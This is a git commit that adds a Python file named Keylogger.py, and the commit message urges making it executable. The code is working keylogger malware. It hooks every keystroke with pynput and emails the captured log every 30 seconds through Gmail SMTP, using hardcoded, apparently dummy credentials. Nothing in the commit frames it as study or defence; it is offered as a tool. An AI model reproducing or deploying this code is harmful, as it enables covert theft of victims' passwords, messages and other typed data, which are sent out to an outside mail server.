7a164c7a9239c965481936ca68cc128fa6f3fcf3
Pratik Karan <76545948+PratikKaran23@users.noreply.github.com>
2021-02-16 15:59:28 +0530

    Add files via upload
    This File Is in Txt format. Make It in Executable For Better Experience

---
+++ Keylogger.py
@@ -0,0 +1,47 @@
+#!/usr/bin/env python
+import pynput.keyboard, threading, smtplib
+
+
+class Keylogger:
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger Started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
+    def process_key_process(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
+
+    def report(self):
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_process)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+
+
+my_keylogger = Keylogger(30, "dummyccount31@gmail.com", "this1sdummyp@ssword")
+
+my_keylogger.start()
